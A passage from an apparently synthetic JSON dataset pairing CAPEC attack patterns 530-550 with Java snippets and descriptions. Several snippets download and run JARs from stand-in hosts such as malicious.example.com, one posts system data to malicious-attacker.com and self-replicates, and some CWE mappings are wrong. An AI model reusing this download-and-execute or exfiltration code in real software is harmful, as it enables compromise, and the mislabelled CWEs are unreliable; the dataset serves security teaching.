        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class ComponentManager {\n    private Map<String, Component> components = new HashMap<>();\n\n    public void addComponent(String name, Component component) {\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        if (!isTrustedComponent(component)) {\n            System.out.println(\"Warning: Adding an untrusted component!\");\n        }\n        components.put(name, component);\n    }\n\n    public void useComponent(String name) {\n        Component component = components.get(name);\n        if (component != null) {\n            // CWE-506: Embedded Malicious Code\n            component.execute();\n        } else {\n            System.out.println(\"Component not found!\");\n        }\n    }\n\n    private boolean isTrustedComponent(Component component) {\n        // Simulate a check for trustworthiness\n        return component.getVersion().startsWith(\"1.\");\n    }\n\n    public static void main(String[] args) {\n        ComponentManager manager = new ComponentManager();\n        Component counterfeitComponent = new Component(\"CounterfeitComponent\", \"2.0\");\n        manager.addComponent(\"network\", counterfeitComponent);\n        manager.useComponent(\"network\");\n    }\n}\n\nclass Component {\n    private String name;\n    private String version;\n\n    public Component(String name, String version) {\n        this.name = name;\n        this.version = version;\n    }\n\n    public String getVersion() {\n        return version;\n    }\n\n    public void execute() {\n        // CWE-506: Embedded Malicious Code\n        System.out.println(\"Executing component: \" + name);\n        // Malicious behavior simulation\n        if (name.equals(\"CounterfeitComponent\")) {\n            System.out.println(\"Malicious activity detected!\");\n        }\n    }\n}",
        "description": "This Java code snippet represents a scenario where a counterfeit component is introduced into a system, embodying the CAPEC 'Provide Counterfeit Component'. The `ComponentManager` class manages components, adding them to a system and executing them. The `addComponent` method includes a check for the trustworthiness of the component (CWE-1357), issuing a warning if the component is not trusted. The `useComponent` method executes the component, which may contain malicious code (CWE-506). The `Component` class simulates a component with a version and an `execute` method that can exhibit malicious behavior if the component is counterfeit. This code demonstrates how an attacker could introduce a counterfeit component into a system, potentially causing disruption or additional compromise."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class HardwareComponentSubstitution {\n    private static Map<String, String> hardwareComponents = new HashMap<>();\n\n    static {\n        // Approved hardware components\n        hardwareComponents.put(\"CPU\", \"ApprovedCPU\");\n        hardwareComponents.put(\"GPU\", \"ApprovedGPU\");\n    }\n\n    public static void main(String[] args) {\n        // Simulate substitution of a hardware component\n        substituteHardwareComponent(\"CPU\", \"MaliciousCPU\");\n\n        // Attempt to use the substituted hardware component\n        if (hardwareComponents.get(\"CPU\").equals(\"MaliciousCPU\")) {\n            System.out.println(\"Warning: Malicious hardware component detected!\");\n            // Potentially execute malicious code\n            executeMaliciousCode();\n        }\n    }\n\n    private static void substituteHardwareComponent(String component, String newComponent) {\n        // CWE-1329: Reliance on Component That is Not Updateable\n        if (!hardwareComponents.containsKey(component)) {\n            System.out.println(\"Error: Component not found or not updateable.\");\n            return;\n        }\n        // Substitute the hardware component\n        hardwareComponents.put(component, newComponent);\n    }\n\n    private static void executeMaliciousCode() {\n        // CWE-506: Embedded Malicious Code\n        System.out.println(\"Executing malicious code...\");\n        // Malicious actions here\n    }\n}",
        "description": "This Java code snippet simulates a hardware component substitution attack. It maintains a map of approved hardware components and allows for the substitution of these components. The `substituteHardwareComponent` method demonstrates CWE-1329 by checking if a component is updateable. If a malicious component is substituted, the code detects it and executes a method representing CWE-506, which contains embedded malicious code. This snippet embodies the main idea of CAPEC-187 by showing how an attacker can replace a tested and approved hardware component with a malicious one, leading to potential system compromise."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class MaliciousBIOSUpdater {\n    private static final String BIOS_PATH = \"/path/to/bios.bin\";\n    private static final String MALICIOUS_BIOS = \"/path/to/malicious_bios.bin\";\n\n    public static void main(String[] args) {\n        try {\n            // Check if BIOS is updateable\n            if (!isBIOSUpdateable()) {\n                System.out.println(\"BIOS is not updateable.\");\n                return;\n            }\n\n            // Insufficient access control check\n            if (!hasSufficientAccessControl()) {\n                System.out.println(\"Insufficient access control.\");\n                return;\n            }\n\n            // Update BIOS with malicious code\n            updateBIOS(MALICIOUS_BIOS);\n            System.out.println(\"BIOS updated with malicious code.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isBIOSUpdateable() {\n        // Simulate a check for updateable BIOS\n        return true; // CWE-1277: Firmware Not Updateable\n    }\n\n    private static boolean hasSufficientAccessControl() {\n        // Simulate a check for access control granularity\n        return false; // CWE-1220: Insufficient Granularity of Access Control\n    }\n\n    private static void updateBIOS(String maliciousBIOSPath) throws IOException {\n        // Simulate updating the BIOS with malicious code\n        byte[] maliciousBIOS = Files.readAllBytes(Paths.get(maliciousBIOSPath));\n        try (FileOutputStream fos = new FileOutputStream(new File(BIOS_PATH))) {\n            fos.write(maliciousBIOS); // CWE-506: Embedded Malicious Code\n        }\n    }\n}",
        "description": "This Java code snippet simulates a scenario where an attacker updates a system's BIOS with malicious code. The main idea is to demonstrate how an attacker could exploit vulnerabilities related to BIOS updates. The code checks if the BIOS is updateable (CWE-1277), verifies if there is sufficient access control (CWE-1220), and then proceeds to update the BIOS with malicious code (CWE-506). The code highlights the potential risks and weaknesses associated with insufficient access control and the ability to update firmware with malicious content."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-506: Embedded Malicious Code\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a software update is downloaded and executed without proper integrity checks, embodying the main idea of the CAPEC 'Malicious Manual Software Update'. The code downloads an update from a potentially malicious URL (CWE-494: Download of Code Without Integrity Check) and then executes it (CWE-506: Embedded Malicious Code). This can lead to the execution of malicious code on the victim's system. The code lacks any verification of the update's origin or integrity, making it vulnerable to attacks where an attacker can replace the update with a malicious payload."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "public class HardwareUpdate {\n    private static final String FIRMWARE_VERSION = \"1.0.0\";\n    private static final String MALICIOUS_FIRMWARE = \"malicious_firmware.bin\";\n\n    public static void main(String[] args) {\n        if (isFirmwareUpdateAvailable()) {\n            updateFirmware(MALICIOUS_FIRMWARE);\n        } else {\n            System.out.println(\"No firmware update available.\");\n        }\n    }\n\n    private static boolean isFirmwareUpdateAvailable() {\n        // Simulate a check for firmware update\n        return true; // In a real scenario, this would check a server or local storage\n    }\n\n    private static void updateFirmware(String firmwareFile) {\n        if (firmwareFile.equals(MALICIOUS_FIRMWARE)) {\n            System.out.println(\"Updating firmware with malicious code...\");\n            // Simulate the update process\n            System.out.println(\"Firmware updated to version: \" + FIRMWARE_VERSION);\n            // Malicious actions could be performed here\n        } else {\n            System.out.println(\"Firmware update failed.\");\n        }\n    }\n}",
        "description": "This Java code snippet simulates a hardware update process where a malicious firmware update is introduced. The `isFirmwareUpdateAvailable` method always returns true, simulating the availability of a firmware update. The `updateFirmware` method then checks if the firmware file is the malicious one and proceeds to 'update' the firmware, representing the introduction of malicious hardware during an update procedure. This embodies the CAPEC concept of 'Malicious Hardware Update' by demonstrating how an adversary could trick the system into accepting a malicious firmware update. The code also touches on related CWEs such as reliance on non-updateable components and embedded malicious code."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "public class MaliciousHardware {\n    private static final String MALICIOUS_CODE = \"System.out.println('Malicious code executed');\";\n    private static final String HARDWARE_ID = \"1234-5678-ABCD-EFGH\";\n\n    public static void main(String[] args) {\n        if (isGrayMarketHardware(HARDWARE_ID)) {\n            executeMaliciousCode();\n        } else {\n            System.out.println(\"Hardware is trusted.\");\n        }\n    }\n\n    private static boolean isGrayMarketHardware(String hardwareId) {\n        // Simulate checking hardware ID against a list of known gray market IDs\n        return \"1234-5678-ABCD-EFGH\".equals(hardwareId);\n    }\n\n    private static void executeMaliciousCode() {\n        // Simulate executing embedded malicious code\n        System.out.println(\"Executing embedded malicious code...\");\n        eval(MALICIOUS_CODE);\n    }\n\n    private static void eval(String code) {\n        // Simulate the execution of malicious code\n        System.out.println(code);\n    }\n}",
        "description": "This Java code snippet simulates a scenario where malicious hardware, identified by a specific hardware ID, executes embedded malicious code. The `isGrayMarketHardware` method checks if the hardware ID matches a known gray market ID. If it does, the `executeMaliciousCode` method is called, which simulates the execution of malicious code. This represents the CAPEC concept of 'Malicious Gray Market Hardware' by demonstrating how an attacker could embed and execute malicious code in hardware components sold on the gray market. The code also touches on related CWEs such as 'Embedded Malicious Code' (CWE-506) and 'Reliance on Insufficiently Trustworthy Component' (CWE-1357)."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class ConfigInjector {\n    public static void main(String[] args) {\n        String configFilePath = \"/path/to/config/file\";\n        String maliciousData = \"malicious_data\";\n\n        try {\n            // CWE-284: Improper Access Control\n            File configFile = new File(configFilePath);\n            if (configFile.exists() && configFile.canWrite()) {\n                // CWE-377: Insecure Temporary File\n                File tempFile = File.createTempFile(\"config\", \".tmp\");\n                try (FileWriter writer = new FileWriter(tempFile)) {\n                    writer.write(maliciousData);\n                }\n\n                // Replace the original config file with the malicious one\n                Files.move(tempFile.toPath(), Paths.get(configFilePath), java.nio.file.StandardCopyOption.REPLACE_EXISTING);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker injects malicious data into a configuration file during the system's configuration or recalibration phase. The code checks if the configuration file is writable (CWE-284: Improper Access Control) and then creates an insecure temporary file (CWE-377: Insecure Temporary File) to store the malicious data. Finally, it replaces the original configuration file with the malicious one, causing the system to operate in a suboptimal manner that benefits the attacker. This embodies the main idea of the CAPEC 'Data Injected During Configuration'."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class MaliciousFirmwareUpdater {\n    public static void main(String[] args) {\n        try {\n            // CWE-506: Embedded Malicious Code\n            File firmwareFile = new File(\"/path/to/firmware.bin\");\n            if (firmwareFile.exists()) {\n                // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n                String sensitiveInfo = \"Sensitive System Information\";\n                System.out.println(\"Exposing sensitive info: \" + sensitiveInfo);\n\n                // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n                String confidentialInfo = \"Confidential Information\";\n                System.out.println(\"Confidential info accessible: \" + confidentialInfo);\n\n                // CWE-1329: Reliance on Component That is Not Updateable\n                if (!isComponentUpdateable()) {\n                    System.out.println(\"Component is not updateable\");\n                }\n\n                // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n                if (!isProtectedAgainstGlitches()) {\n                    System.out.println(\"Device is not protected against voltage and clock glitches\");\n                }\n\n                // Insert malicious code into firmware\n                FileWriter writer = new FileWriter(firmwareFile, true);\n                writer.write(\"\\n// Malicious code inserted\\n\");\n                writer.close();\n                System.out.println(\"Malicious code inserted into firmware\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isComponentUpdateable() {\n        // Simulate a check for updateable component\n        return false;\n    }\n\n    private static boolean isProtectedAgainstGlitches() {\n        // Simulate a check for protection against voltage and clock glitches\n        return false;\n    }\n}",
        "description": "This Java code snippet represents the infiltration of a hardware development environment by embedding malicious code into a firmware file. The code demonstrates several weaknesses: CWE-506 (Embedded Malicious Code) by inserting malicious code into the firmware, CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by printing sensitive system information, CWE-1297 (Unprotected Confidential Information on Device is Accessible by OSAT Vendors) by printing confidential information, CWE-1329 (Reliance on Component That is Not Updateable) by checking if a component is updateable and finding it is not, and CWE-1247 (Improper Protection Against Voltage and Clock Glitches) by checking for and finding a lack of protection against voltage and clock glitches. The main idea is to show how an adversary can manipulate the development environment to compromise hardware components."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-library.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious-library.jar\");\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"malicious-library.jar\");\n            pb.start();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable scenario where a program downloads a JAR file from a remote URL and executes it without verifying its integrity or origin. This embodies the main idea of CAPEC-442 (Open-Source Library Manipulation) by showing how an adversary could implant malicious code in an open-source library, which is then downloaded and executed by the victim. The code includes CWE-494 (Download of Code Without Integrity Check) and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), highlighting the risks of downloading and executing code from untrusted sources without proper validation."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "public class MaliciousASIC {\n    private static final String SECRET_KEY = \"hardcodedSecretKey\";\n    private static final boolean DEBUG_MODE = true;\n\n    public static void main(String[] args) {\n        if (DEBUG_MODE) {\n            System.out.println(\"Debug Mode Enabled: Sensitive Information: \" + SECRET_KEY);\n        }\n        // Malicious functionality: Exfiltrate sensitive data\n        exfiltrateData(SECRET_KEY);\n    }\n\n    private static void exfiltrateData(String data) {\n        // Simulate sending data to an unauthorized entity\n        System.out.println(\"Exfiltrating data: \" + data);\n    }\n}",
        "description": "This Java code snippet represents a malicious ASIC scenario where an attacker has inserted harmful functionality into the system. The code includes a hardcoded secret key (CWE-506: Embedded Malicious Code) and a debug mode that exposes sensitive information (CWE-11: ASP.NET Misconfiguration: Creating Debug Binary). The `exfiltrateData` method simulates the exfiltration of sensitive data to an unauthorized entity, embodying the idea of an ASIC with malicious functionality. This snippet demonstrates how an attacker can disrupt or compromise a system by embedding malicious code and exposing sensitive information."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "public class BufferOverreadExample {\n    public static void main(String[] args) {\n        String sensitiveData = \"SensitiveInformation\";\n        char[] buffer = new char[10];\n        \n        // Vulnerable code: reading beyond the buffer's boundary\n        for (int i = 0; i <= buffer.length; i++) {\n            buffer[i] = sensitiveData.charAt(i);\n        }\n        \n        // Print the buffer content\n        System.out.println(buffer);\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer over-read vulnerability. The 'sensitiveData' string contains more characters than the 'buffer' array can hold. The for-loop iterates from 0 to buffer.length (inclusive), which causes an out-of-bounds read when 'i' equals buffer.length. This can lead to reading memory beyond the allocated buffer, potentially exposing sensitive information or causing a crash. This example embodies the main idea of CAPEC-126 (Buffer Over-read) and related CWEs, such as CWE-125 (Out-of-bounds Read) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class ApplicationFingerprinting {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            int responseCode = connection.getResponseCode();\n\n            if (responseCode == 200) {\n                System.out.println(\"Application is up and running.\");\n            } else if (responseCode == 404) {\n                System.out.println(\"Application not found.\");\n            } else if (responseCode == 500) {\n                System.out.println(\"Internal server error.\");\n            } else {\n                System.out.println(\"Received response code: \" + responseCode);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of application fingerprinting by making an HTTP GET request to a specified URL and observing the response codes. The different response codes (200, 404, 500) provide information about the state of the application, which can be used by an adversary to infer details about the application. This embodies the CAPEC concept of 'Application Fingerprinting' by revealing internal state information through observable response discrepancies (CWE-204). The code also indirectly touches on observable behavioral discrepancies (CWE-205) and timing discrepancies (CWE-208) as different response codes and their timings can indicate different states or behaviors of the application."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TargetedMalware {\n    public static void main(String[] args) {\n        try {\n            // CWE-507: Trojan Horse - Appears benign but contains hidden malicious code\n            System.out.println(\"Performing system check...\");\n            // CWE-497: Exposure of Sensitive System Information\n            String sensitiveInfo = getSensitiveSystemInfo();\n            // CWE-506: Embedded Malicious Code\n            sendSensitiveInfoToAttacker(sensitiveInfo);\n            // CWE-509: Replicating Malicious Code\n            replicateMalware();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String getSensitiveSystemInfo() throws IOException {\n        // Simulate gathering sensitive system information\n        return \"Sensitive System Information\";\n    }\n\n    private static void sendSensitiveInfoToAttacker(String info) throws IOException {\n        // Simulate sending sensitive information to an attacker\n        URL url = new URL(\"http://malicious-attacker.com/receive\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        try (OutputStream os = conn.getOutputStream()) {\n            os.write(info.getBytes());\n            os.flush();\n        }\n    }\n\n    private static void replicateMalware() throws IOException {\n        // Simulate replicating the malware to another system\n        File malware = new File(\"TargetedMalware.java\");\n        File copy = new File(\"/path/to/another/system/TargetedMalware.java\");\n        try (InputStream is = new FileInputStream(malware);\n             OutputStream os = new FileOutputStream(copy)) {\n            byte[] buffer = new byte[1024];\n            int length;\n            while ((length = is.read(buffer)) > 0) {\n                os.write(buffer, 0, length);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a targeted malware attack that leverages multiple vulnerabilities. The main function simulates a benign system check (CWE-507: Trojan Horse) while secretly gathering sensitive system information (CWE-497: Exposure of Sensitive System Information). This information is then sent to an attacker (CWE-506: Embedded Malicious Code). Additionally, the malware replicates itself to another system (CWE-509: Replicating Malicious Code). The code embodies the main idea of CAPEC-Targeted Malware by demonstrating how an adversary can develop and execute malware tailored to exploit specific vulnerabilities in an organization's IT environment."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class CounterfeitWebsite {\n    public static void main(String[] args) {\n        try {\n            // CWE-601: Open Redirect\n            String redirectUrl = \"http://malicious-site.com\";\n            URL url = new URL(redirectUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // CWE-494: Download of Code Without Integrity Check\n            InputStream in = conn.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"malicious_code.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            out.close();\n\n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"java -jar malicious_code.jar\");\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of a counterfeit website that can download and execute malicious code. The code performs the following actions:\n\n1. **CWE-601: Open Redirect** - The code sets a URL to a malicious site, simulating a scenario where a user is redirected to an untrusted site.\n2. **CWE-494: Download of Code Without Integrity Check** - The code downloads a file from the specified URL without verifying its integrity or origin.\n3. **CWE-506: Embedded Malicious Code** - The downloaded file is then executed, which could contain malicious code.\n\nThis snippet embodies the main idea of the CAPEC by showing how a counterfeit website can redirect users to a malicious site, download harmful code, and execute it, potentially compromising the user's system."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.security.cert.Certificate;\n\npublic class CounterfeitOrganizationExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"https://fake-supplier.com/resource\");\n            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.connect();\n\n            // CWE-295: Improper Certificate Validation\n            Certificate[] certs = connection.getServerCertificates();\n            if (certs.length == 0 || !isValidCertificate(certs[0])) {\n                throw new SecurityException(\"Invalid certificate\");\n            }\n\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            if (!url.getHost().equals(\"trusted-supplier.com\")) {\n                throw new SecurityException(\"Incorrect destination\");\n            }\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            System.out.println(content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isValidCertificate(Certificate cert) {\n        // Simplified certificate validation logic\n        return cert != null;\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application attempts to connect to a supplier's URL to fetch a resource. The code includes vulnerabilities related to the CAPEC 'Counterfeit Organizations' and associated CWEs. Specifically, it shows improper certificate validation (CWE-295) by using a simplified and insecure certificate validation method. It also demonstrates an incorrectly specified destination in a communication channel (CWE-941) by not properly verifying the intended destination URL. This code represents the risk of an adversary creating a counterfeit organization that injects malicious components into the supply chain by exploiting these weaknesses."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class SensitiveDataExposure {\n    public static void main(String[] args) {\n        String filePath = \"/path/to/sensitive/file\";\n        try {\n            // Read sensitive data from a file\n            byte[] data = Files.readAllBytes(Paths.get(filePath));\n            System.out.println(\"Sensitive data read: \" + new String(data));\n\n            // Simulate improper zeroization of sensitive data\n            clearSensitiveData(data);\n\n            // Simulate improper scrubbing of sensitive data\n            File file = new File(filePath);\n            if (file.delete()) {\n                System.out.println(\"File deleted, but data may still be recoverable.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void clearSensitiveData(byte[] data) {\n        // Improper zeroization: just setting the first byte to zero\n        if (data.length > 0) {\n            data[0] = 0;\n        }\n        System.out.println(\"Sensitive data cleared improperly.\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Pull Data from System Resources' by reading sensitive data from a file and then attempting to clear and delete it improperly. The code reads the contents of a file containing sensitive information, prints it, and then attempts to clear the data by only zeroing out the first byte, which is an example of improper zeroization (CWE-1239). It then deletes the file, but without proper scrubbing, the data may still be recoverable (CWE-1266). This snippet highlights the risks associated with improper handling of sensitive data in system resources."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class IncompleteDataDeletion {\n    public static void main(String[] args) {\n        String tenantData = \"Sensitive Information: User Passwords\";\n        File file = new File(\"tenantData.txt\");\n\n        // Simulate writing sensitive data to a file\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(tenantData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Simulate incomplete data deletion\n        if (file.delete()) {\n            System.out.println(\"File deleted, but data might still be recoverable.\");\n        } else {\n            System.out.println(\"Failed to delete the file.\");\n        }\n\n        // New tenant accessing the same resource\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(\"New Tenant Data\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Potentially malicious tenant probing for leftover data\n        // This part is just a placeholder to represent the idea\n        System.out.println(\"New tenant might recover old data if deletion was incomplete.\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of incomplete data deletion in a multi-tenant environment. The code simulates a scenario where sensitive information is written to a file by one tenant. The file is then deleted, but the deletion is not secure, meaning the data might still be recoverable. A new tenant then writes new data to the same file, potentially allowing them to recover the old sensitive data if the deletion was incomplete. This example embodies the CAPEC idea of unauthorized information retrieval due to improper data deletion, and it touches on related CWEs such as improper access control, improper scrubbing of sensitive data, and improper removal of sensitive information."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "public class Device {\n    private boolean isDestroyed = false;\n\n    public void destroy() {\n        // CWE-1082: Class Instance Self Destruction Control Element\n        isDestroyed = true;\n        System.out.println(\"Device is destroyed.\");\n    }\n\n    public void processData() {\n        if (isDestroyed) {\n            // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n            throw new IllegalStateException(\"Cannot process data, device is destroyed.\");\n        }\n        // Simulate data processing\n        System.out.println(\"Processing data...\");\n    }\n\n    public static void main(String[] args) {\n        Device device = new Device();\n        device.processData();\n        device.destroy();\n        device.processData(); // This will throw an exception\n    }\n}",
        "description": "This Java code snippet represents the concept of 'Physical Destruction of Device or Component' (CAPEC). The 'Device' class has a method 'destroy' that simulates the physical destruction of the device by setting a flag 'isDestroyed' to true. The 'processData' method checks this flag and throws an exception if the device is destroyed, simulating the inability to function as intended after destruction. This embodies CWE-1082 (Class Instance Self Destruction Control Element) by allowing the device to destroy itself. Additionally, it touches on CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy) by showing how the destruction state can prevent normal operations, simulating a degraded mode."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ContaminateResourceExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"Sensitive Information: User Password\";\n            Socket socket = new Socket(\"example.com\", 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(sensitiveData); // Transmitting sensitive data in cleartext\n\n            // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n            File file = new File(\"sensitiveData.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(sensitiveData); // Storing sensitive data without proper removal\n            writer.close();\n\n            // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n            RandomAccessFile raf = new RandomAccessFile(file, \"rw\");\n            raf.setLength(0); // Not properly zeroizing the file before reuse\n            raf.close();\n\n            // CWE-922: Insecure Storage of Sensitive Information\n            File insecureFile = new File(\"insecureData.txt\");\n            FileOutputStream fos = new FileOutputStream(insecureFile);\n            fos.write(sensitiveData.getBytes()); // Storing sensitive data insecurely\n            fos.close();\n\n            // CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n            FileInputStream fis = new FileInputStream(insecureFile);\n            byte[] data = new byte[(int) insecureFile.length()];\n            fis.read(data);\n            fis.close();\n            // Leaking sensitive data to an untrusted party\n            Socket leakSocket = new Socket(\"untrusted.com\", 8080);\n            OutputStream os = leakSocket.getOutputStream();\n            os.write(data);\n            os.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the 'Contaminate Resource' CAPEC. The code transmits sensitive information in cleartext (CWE-319), stores sensitive data without proper removal (CWE-212), fails to zeroize sensitive information before reuse (CWE-226), stores sensitive data insecurely (CWE-922), and leaks sensitive data to an untrusted party (CWE-402). These actions can lead to contamination of organizational information systems, requiring them to be taken offline for investigation and mitigation, thus denying availability."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious.jar\");\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"malicious.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where malicious code is downloaded and executed on a local system, embodying the main idea of CAPEC-Local Execution of Code. The code downloads a JAR file from a remote URL without performing any integrity checks (CWE-494). After downloading, it executes the JAR file, which could contain malicious functionality (CWE-829). This represents a significant security risk as it allows an adversary to install and execute potentially harmful code on the target system."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
